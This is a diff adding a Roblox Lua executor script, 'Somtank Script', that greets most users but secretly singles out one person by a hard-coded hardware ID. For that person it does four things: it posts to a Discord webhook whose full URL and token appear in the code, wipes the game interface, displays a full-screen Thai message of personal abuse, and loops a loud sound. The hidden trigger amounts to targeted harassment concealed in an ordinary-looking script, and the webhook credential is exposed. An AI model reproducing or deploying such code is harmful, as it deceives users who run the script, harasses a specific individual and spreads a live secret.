@@ -1,0 +1,39 @@
+
+if not gethwid() then warn("Executor นี้ไม่รองรับ gethwid()") return end
+local TergetHWID = "1cde98a8a301738dcd8cfc91953fa814a74cce29ee46357d01636a243f11b624c99ef27a4963965adcbabed0d8e31f85"
+
+if tostring(gethwid()) == TergetHWID then
+	local player = game.Players.LocalPlayer
+	local character = player.Character
+	local plrGui = player.PlayerGui
+	local CoreGui = game:GetService("CoreGui")
+	local WebHookUrl = "https://discord.com/api/webhooks/1378634865796317326/jzRjm7lmUsT5w79Py1ryr2AxQ8UNIf6pbu07h-mR9_n8R4-kmvEIQ_pytguKSYdCQQ7F"
+	local data = {["content"] = "มันโดนกูด่าละ",["username"] = "Somtank Script"}
+	local headers = {['Content-Type'] = 'application/json',}
+	local send_success = pcall(function()
+		local http_request = request or http_request or syn.request
+		if http_request then
+			http_request({Url = WebHookUrl,Method = 'POST',Headers = headers,Body = game:GetService("HttpService"):JSONEncode(data),})
+		end
+	end)
+	for i,v in ipairs(CoreGui:GetChildren()) do
+		v:Destroy()
+	end
+	for i,v in ipairs(plrGui:GetChildren()) do
+		v:Destroy()
+	end
+	ScreenGui = Instance.new("ScreenGui", CoreGui)
+	TextLabel = Instance.new("TextLabel", ScreenGui)
+	TextLabel.Size = UDim2.new(1,0,1,0)
+	TextLabel.BackgroundColor3 = Color3.new(0, 0, 0)
+	TextLabel.Text = "มึงด่ากูแล้วยังจะมาเล่นสคริปกูเนาะอีสันดาน หน้าด้าน ขยะสังคม อายุ 22 แล้วแค่นี้คิดไม่ได้ มึงโตแต่ตัวหรออีห่า ชาติชั่ว กินยาบ้างนะมันจะเป็นเอาหนัก "
+	TextLabel.TextScaled = true
+	TextLabel.TextColor3 = Color3.new(1, 1, 1)
+	Sound = Instance.new("Sound", game:GetService("SoundService"))
+	Sound.SoundId = "rbxassetid://8496017782"
+	Sound.Looped = true
+	Sound:Play()
+	Sound.Volume = 10
+else
+	print("*-*-*-* !Welcome to Somtank! *-*-*-*")
+end
